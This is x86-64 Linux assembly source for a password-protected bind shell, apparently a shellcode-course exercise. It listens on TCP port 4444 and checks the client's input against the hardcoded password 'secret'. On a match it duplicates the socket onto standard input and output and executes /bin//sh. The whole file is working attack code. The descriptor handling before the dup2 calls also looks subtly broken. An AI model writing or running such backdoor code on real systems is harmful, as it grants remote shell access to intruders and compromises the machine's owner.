;password secret
global _start

default rel
section .data
    okmsg db "AUTH OK",10
    oklen equ $-okmsg

    failmsg db "AUTH FAIL",10
    faillen equ $-failmsg

section .bss
    buffer resb 16
section .text
_start:

        ; sock 
        mov rax, 41
        mov rdi, 2
        mov rsi, 1
        mov rdx, 0
        syscall

        mov rdi, rax
        xor rax, rax
        push rax
        mov dword [rsp-4], eax
        mov word [rsp-6], 0x5c11
        mov word [rsp-8], 0x2
        sub rsp, 8
         
        ; bind
        mov rax, 49
        mov rsi, rsp
        mov rdx, 16
        syscall

        ; listen
        mov rax, 50
        mov rsi, 2
        syscall
        mov rax, 43
        sub rsp, 16
        mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp
        syscall
        mov r9, rax

; read password from client
mov rax, 0
mov rdi, r9
mov rsi, buffer
mov rdx, 16
syscall

; compare password
mov al, [buffer]
cmp al, 's'
jne auth_fail

mov al, [buffer+1]
cmp al, 'e'
jne auth_fail

mov al, [buffer+2]
cmp al, 'c'
jne auth_fail

mov al, [buffer+3]
cmp al, 'r'
jne auth_fail

mov al, [buffer+4]
cmp al, 'e'
jne auth_fail

mov al, [buffer+5]
cmp al, 't'
jne auth_fail

mov rax, 1
mov rdi, r9
mov rsi, okmsg
mov rdx, oklen
syscall
jmp continue_server

auth_fail:
mov rax, 1
mov rdi, r9
mov rsi, failmsg
mov rdx, faillen
syscall

mov rax, 3
mov rdi, r9
syscall

mov rax, 60
xor rdi, rdi
syscall

continue_server:

        mov rax, 3
        syscall
        mov rdi, r9
        mov rax, 33
        mov rsi, 0
        syscall
        mov rax, 33
        mov rsi, 1
        syscall
        mov rax, 33
        mov rsi, 2
        syscall

        ; execve
        xor rax, rax
        push rax
        mov rbx, 0x68732f2f6e69622f
        push rbx
        mov rdi, rsp
        push rax
        mov rdx, rsp
        push rdi
        mov rsi, rsp
        add rax, 59
        syscall
